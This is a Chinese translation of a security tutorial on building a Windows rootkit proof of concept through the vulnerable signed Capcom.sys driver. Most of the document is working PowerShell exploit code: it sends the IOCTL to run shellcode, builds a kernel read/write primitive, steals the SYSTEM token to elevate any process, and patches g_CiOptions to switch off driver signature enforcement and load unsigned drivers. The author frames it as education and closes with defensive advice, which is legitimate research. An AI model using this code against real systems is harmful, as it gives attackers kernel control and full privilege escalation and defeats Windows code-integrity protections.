
# 【技术分享】Capcom Rootkit PoC的实现（含演示视频）


                                阅读量   
                                **94226**
                            
                        |
                        
                                                                                                                                    ![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：fuzzysecurity.com
                                <br>原文地址：[http://www.fuzzysecurity.com/tutorials/28.html](http://www.fuzzysecurity.com/tutorials/28.html)

译文仅供参考，具体内容表达以及含义原文为准

**[![](./img/85684/t01e7d355d8b3eb4cc0.jpg)](./img/85684/t01e7d355d8b3eb4cc0.jpg)**

****

翻译：[myswsun](http://bobao.360.cn/member/contribute?uid=2775084127)

预估稿费：160RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿



**0x00 前言**

最近，我读了一篇关于Derusbi恶意软件的[文章](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/)。那篇文章主要是关于恶意软件作者使用了一种技术，利用签名的Novell驱动的漏洞（CVE-2013-3956）修改一些内核中的位来临时禁用驱动签名。一旦禁用了，Derusbi加载一个NDIS驱动，可能用来嗅探原始数据包的传输（我没有细看）。

不管怎样，我很好奇相同功能的PoC有多困难（事实是也不是很困难）。为了完整描述攻击者的场景，我决定使用签名驱动（Capcom.sys）中的漏洞，它首先由[TheWackOlian](https://twitter.com/TheWack0lian/status/779397840762245124)在2016年9月23日披露。

<br>

**0x01 资源**

Capcom-Rootkit（[@FuzzySec](https://twitter.com/fuzzysec)）- [这里](https://github.com/FuzzySecurity/Capcom-Rootkit)

Derusbi绕过Windows驱动签名 – [这里](http://www.sekoia.fr/blog/windows-driver-signing-bypass-by-derusbi/)

快速浏览强制驱动签名（[@j00ru](https://twitter.com/j00ru)） – [这里](http://j00ru.vexillium.org/?p=377)

对抗X64强制驱动签名（[@hFireF0X](https://twitter.com/hfiref0x)）- [这里](http://www.kernelmode.info/forum/viewtopic.php?f=11&amp;t=3322)

<br>

**0x02 驱动漏洞**

本文主要的目的不是分析驱动漏洞。我强烈建议你看下[@TheColonial](https://twitter.com/TheColonial)的演示，以更好的理解利用过程。





本质上，驱动提供了ring0代码执行作为一个服务。它唯一的功能是使用用户层的指针来禁用[SMEP](http://j00ru.vexillium.org/?p=783)，执行指针地址的代码并重新启用SMEP。函数的反汇编如下：

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016626ecf3b8d34680.png)

Powershell PoC如下，描述了如何利用。



```
# Some tricks here
# =&gt; cmp [rax-8], rcx
echo "`n[&gt;] Allocating Capcom payload.."
[IntPtr]$Pointer = [CapCom]::VirtualAlloc([System.IntPtr]::Zero, (8 + $Shellcode.Length), 0x3000, 0x40)
$ExploitBuffer = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8) + $Shellcode
[System.Runtime.InteropServices.Marshal]::Copy($ExploitBuffer, 0, $Pointer, (8 + $Shellcode.Length))
echo "[+] Payload size: $(8 + $Shellcode.Length)"
echo "[+] Payload address: $("{0:X}" -f $Pointer.ToInt64())"
$hDevice = [CapCom]::CreateFile("\.Htsysm72FB", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
if ($hDevice -eq -1) {
    echo "`n[!] Unable to get driver handle..`n"
    Return
} else {
    echo "`n[&gt;] Driver information.."
    echo "[+] lpFileName: \.Htsysm72FB"
    echo "[+] Handle: $hDevice"
}
# IOCTL = 0xAA013044
#---
$InBuff = [System.BitConverter]::GetBytes($Pointer.ToInt64()+8)
$OutBuff = 0x1234
echo "`n[&gt;] Sending buffer.."
echo "[+] Buffer length: $($InBuff.Length)"
echo "[+] IOCTL: 0xAA013044"
[CapCom]::DeviceIoControl($hDevice, 0xAA013044, $InBuff, $InBuff.Length, [ref]$OutBuff, 4, [ref]0, [System.IntPtr]::Zero) |Out-null
```

有了执行任意的shellcode的能力，我选择了一个GDI bitmap原语，能使我们获得在内核中永久性的读写的能力，而不用一遍又一遍的调用驱动。为了创建bitmap，我使用[Stage-gSharedInfoBitmap](https://github.com/FuzzySecurity/PSKernel-Primitives/blob/master/Stage-gSharedInfoBitmap.ps1)，并且使用下面的形式构建了shellcode。



```
# Leak BitMap pointers
echo "`n[&gt;] gSharedInfo bitmap leak.."
$Manager = Stage-gSharedInfoBitmap
$Worker = Stage-gSharedInfoBitmap
echo "[+] Manager bitmap Kernel address: 0x$("{0:X16}" -f $($Manager.BitmapKernelObj))"
echo "[+] Worker bitmap Kernel address: 0x$("{0:X16}" -f $($Worker.BitmapKernelObj))"
# Shellcode buffer
[Byte[]] $Shellcode = @(
    0x48, 0xB8) + [System.BitConverter]::GetBytes($Manager.BitmappvScan0) + @( # mov rax,$Manager.BitmappvScan0
    0x48, 0xB9) + [System.BitConverter]::GetBytes($Worker.BitmappvScan0)  + @( # mov rcx,$Manager.BitmappvScan0
    0x48, 0x89, 0x08,                                                          # mov qword ptr [rax],rcx
    0xC3                                                                       # ret
)
```

这个技术的更多细节能在[@mwrlabs](https://twitter.com/mwrlabs)的标题[A Tale Of Bitmaps: Leaking GDI Objects Post Windows 10 Anniversary Edition](https://labs.mwrinfosecurity.com/blog/a-tale-of-bitmaps/)和我的Windows利用开发教程系列的[part 17](http://www.fuzzysecurity.com/tutorials/expDev/21.html)中找到。

<br>

**0x03 Rootkit功能**

现在我们有了内核中任意读写的能力，我们能开始完成我们的rootkit功能。我决定集中在两个不同的功能上：

1. 将任意读写的PID提升到SYSTEM权限

2. 在运行时禁用强制驱动签名，以便在内核中加载未签名的代码

**任意进程提权**

我们需要遍历EPROCESS结构链表，复制SYSTEM的EPROCESS令牌字段，并且使用这个值覆盖目标进程的EPROCESS结构。没有任何现成的漏洞，我们实际上可以在用户层泄漏一个指针指向System（PID 4）的EPROCESS入口。

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0147e2eecba5505789.png)

应该注意，使用SystemModuleInformation能泄漏当前加载的NT内核的基址，	只在Windows8.1后的中等完整进程中起作用。我们能在Powershell简单实现这个过程，使用Get-LoadedModules，并在KD中验证我们的结果。

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0100a6caa0095fd75e.png)

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0108c32e2f36822759.png)

因此我们有了一种方法，来得到System的EPROCESS结构的指针，并使用我们的bitmap原语我们能够简单的读取与那个进程相关的SYSTEM令牌。最后一件事，我们需要遍历ActiveProcessLinks链表，来找到我们想要提权的进程的EPROCESS结构。列表结构如下（Windows 10 x64）。

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e487ec7551f09c3d.png)

这个列表是个双向循环列表。简单来说，我们将使用我们的bitmap原语来读取当前EPROCESS结构的PID，如果匹配了PID，我们将覆盖这个进程的令牌，如果不能匹配，我们从ActiveProcessLinks-&gt;Flink读取下个EPROCESS结构的地址，并重复。

EPROCESS结构是不透明的（未文档化），且不同的Windows系统会不同，但是我们能维护一个静态的偏移列表。我强烈推荐看一下[@rwfpl](https://twitter.com/rwfpl)的[Terminus Project](http://terminus.rewolf.pl/terminus/)。偷取令牌的逻辑的Powershell实现如下。



```
function Capcom-ElevatePID {
    param ([Int]$ProcPID)
    # Check our bitmaps have been staged into memory
    if (!$ManagerBitmap -Or !$WorkerBitmap) {
        Capcom-StageGDI
        if ($DriverNotLoaded -eq $true) {
            Return
        }
    }
    # Defaults to elevating Powershell
    if (!$ProcPID) {
        $ProcPID = $PID
    }
    # Make sure the pid exists!
    # 0 is also invalid but will default to $PID
    $IsValidProc = ((Get-Process).Id).Contains($ProcPID)
    if (!$IsValidProc) {
        Write-Output "`n[!] Invalid process specified!`n"
        Return
    }
    # _EPROCESS UniqueProcessId/Token/ActiveProcessLinks offsets based on OS
    # WARNING offsets are invalid for Pre-RTM images!
    $OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
    $OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
    switch ($OSMajorMinor)
    {
        '10.0' # Win10 / 2k16
        {
            $UniqueProcessIdOffset = 0x2e8
            $TokenOffset = 0x358          
            $ActiveProcessLinks = 0x2f0
        }
        '6.3' # Win8.1 / 2k12R2
        {
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        }
        '6.2' # Win8 / 2k12
        {
            $UniqueProcessIdOffset = 0x2e0
            $TokenOffset = 0x348          
            $ActiveProcessLinks = 0x2e8
        }
        '6.1' # Win7 / 2k8R2
        {
            $UniqueProcessIdOffset = 0x180
            $TokenOffset = 0x208          
            $ActiveProcessLinks = 0x188
        }
    }
    # Get EPROCESS entry for System process
    $SystemModuleArray = Get-LoadedModules
    $KernelBase = $SystemModuleArray[0].ImageBase
    $KernelType = ($SystemModuleArray[0].ImageName -split "\")[-1]
    $KernelHanle = [Capcom]::LoadLibrary("$KernelType")
    $PsInitialSystemProcess = [Capcom]::GetProcAddress($KernelHanle, "PsInitialSystemProcess")
    $SysEprocessPtr = $PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase
    $CallResult = [Capcom]::FreeLibrary($KernelHanle)
    $SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr
    $SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)
    Write-Output "`n[+] SYSTEM Token: 0x$("{0:X}" -f $SysToken)"
    # Get EPROCESS entry for PID
    $NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
    while($true) {
        $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset)
        if ($NextPID -eq $ProcPID) {
            $TargetTokenAddr = $NextProcess+$TokenOffset
            Write-Output "[+] Found PID: $NextPID"
            Write-Output "[+] PID token: 0x$("{0:X}" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))"
            break
        }
        $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size
    }
    # Duplicate token!
    Write-Output "[!] Duplicating SYSTEM token!`n"
    Bitmap-Write -Address $TargetTokenAddr -Value $SysToken
}
```

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0124422e131738d9d8.png)

**绕过强制驱动签名**

我建议你看下@j00ru的关于强制驱动签名的[write-up](http://j00ru.vexillium.org/?p=377)。结果证明Windows上的代码完整性有一个独立的二进制（ci.dll，%WINDIR%System32）管理。在Windows 8之前，CI导出了一个全局的boolean变量g_CiEnabled，完美的表示签名是否启动。在Windows 8之后，g_CiEnabled被另一个全局变量（g_CiOptions）代替，其是一个标志的组合（最重要的是0x0=禁用，0x6=启用，0x8=测试模式）。

由于Δt free-time限制，这个模块只针对Win8+中使用的g_CiOptions。然而，类似的方法可以用于g_CiEnabled（欢迎GitHub pull 请求）。基本上，我们将使用和Derusbi恶意软件的作者一样的技术。因为g_CiOptions没有导出，我们不得不在patch这个值时做些动态计算。如果我们反编译CI!CiInitialize，我们能看见g_CiOptions的指针。

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013f5a5c28f767f7e8.png)

与我们之前做的类似，我们能在CI!CiInitialize中泄漏地址，而不是用任何漏洞。

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017e3b522bcb21693a.png)

目前只实现了一些逻辑，使用我们的bitmap原语来读取字节，以寻找第一个“jmp”（0xE9），和第一个“mov dword ptr[xxxxx], ecx”（0x890D）。一旦我们有了g_CiOptions的地址，我们能设置我们想要的任何值。Powershell函数如下。



```
function Capcom-DriverSigning {
    param ([Int]$SetValue)
    # Check our bitmaps have been staged into memory
    if (!$ManagerBitmap -Or !$WorkerBitmap) {
        Capcom-StageGDI
        if ($DriverNotLoaded -eq $true) {
            Return
        }
    }
    # Leak CI base =&gt; $SystemModuleCI.ImageBase
    $SystemModuleCI = Get-LoadedModules |Where-Object {$_.ImageName -Like "*CI.dll"}
    # We need DONT_RESOLVE_DLL_REFERENCES for CI LoadLibraryEx
    $CIHanle = [Capcom]::LoadLibraryEx("ci.dll", [IntPtr]::Zero, 0x1)
    $CiInitialize = [Capcom]::GetProcAddress($CIHanle, "CiInitialize")
    # Calculate =&gt; CI!CiInitialize
    $CiInitializePtr = $CiInitialize.ToInt64() - $CIHanle + $SystemModuleCI.ImageBase
    Write-Output "`n[+] CI!CiInitialize: $('{0:X}' -f $CiInitializePtr)"
    # Free CI handle
    $CallResult = [Capcom]::FreeLibrary($CIHanle)
    # Calculate =&gt; CipInitialize
    # jmp CI!CipInitialize
    for ($i=0;$i -lt 500;$i++) {
        $val = ("{0:X}" -f $(Bitmap-Read -Address $($CiInitializePtr + $i))) -split '(..)' | ? { $_ }
        # Look for the first jmp instruction
        if ($val[-1] -eq "E9") {
            $Distance = [Int]"0x$(($val[-3,-2]) -join '')"
            $CipInitialize = $Distance + 5 + $CiInitializePtr + $i
            Write-Output "[+] CI!CipInitialize: $('{0:X}' -f $CipInitialize)"
            break
        }
    }
    # Calculate =&gt; g_CiOptions
    # mov dword ptr [CI!g_CiOptions],ecx
    for ($i=0;$i -lt 500;$i++) {
        $val = ("{0:X}" -f $(Bitmap-Read -Address $($CipInitialize + $i))) -split '(..)' | ? { $_ }
        # Look for the first jmp instruction
        if ($val[-1] -eq "89" -And $val[-2] -eq "0D") {
            $Distance = [Int]"0x$(($val[-6..-3]) -join '')"
            $g_CiOptions = $Distance + 6 + $CipInitialize + $i
            Write-Output "[+] CI!g_CiOptions: $('{0:X}' -f $g_CiOptions)"
            break
        }
    }
    # print g_CiOptions
    Write-Output "[+] Current CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
    if ($SetValue) {
        Bitmap-Write -Address $g_CiOptions -Value $SetValue
        # print new g_CiOptions
        Write-Output "[!] New CiOptions Value: $('{0:X}' -f $(Bitmap-Read -Address $g_CiOptions))`n"
    }
}
```

截图如下，当前的g_CiOptions值是0x6（驱动签名启动了），且阻止了我们加载evil.sys。

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0172d8cc924976f4af.png)

在覆写这个值后，我们能成功加载我们的未签名的驱动。

[![](./img/85684/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01de120a908ece0c2f.png)

不过g_CiOptions被PatchGuard保护，意味着如果这个值改变了，Windows将蓝屏（CRITICAL_STRUCTURE_CORRUPTION）。然而这个不太可能发生，当测试时我不得不等待了一个小时才等到PatchGuard触发。如果你加载了未签名的驱动，且恢复了这个值，PatchGuard将不会意识到。我的深度防御的建议是在驱动加载时触发CI的PatchGuard检查，尽管这个也不能阻止攻击者反射加载驱动，但会提高门槛。

<br>

**0x04 想法**

第三方，签名的驱动对Windows内核构成了严重威胁，我确信这个例子已经说明了这种情况。我也发现实现简单的内核subversion比想象中容易，尤其是与PatchGuard有关的。总的来说，我认为最明智的做法是组织使用驱动白名单来部署设备保护，以便消除这种类型的攻击。

[Capcom-Rootkit](https://github.com/FuzzySecurity/Capcom-Rootkit)在GitHub中提供，用于教育/测试的目的，不要做坏事。
